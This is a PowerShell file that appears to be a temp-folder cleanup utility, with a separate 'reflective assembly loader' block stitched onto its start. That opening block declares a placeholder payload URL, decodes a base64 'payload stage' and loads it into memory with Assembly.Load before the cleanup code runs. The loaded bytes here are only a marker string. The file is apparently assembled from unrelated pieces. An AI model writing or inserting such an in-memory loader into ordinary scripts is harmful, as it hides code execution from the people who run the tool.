<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://example.org/payload.bin",
    [int]$TimeoutSec = 18
)
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo0OXVmZjhpMG9o")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.EXAMPLE
    .\Invoke-TempCleanup.ps1 -AgeDays 30
#>

$TempRoot  = $env:TEMP
$AgeDays   = 30
$MinSizeMB = 10
$LogPath   = 'C:\Logs\temp-cleanup-2026-09-27.log'
$DryRun    = $false

$culture = [System.Globalization.CultureInfo]::InvariantCulture

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
Add-Content -Path $LogPath -Value $line -Encoding UTF8

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
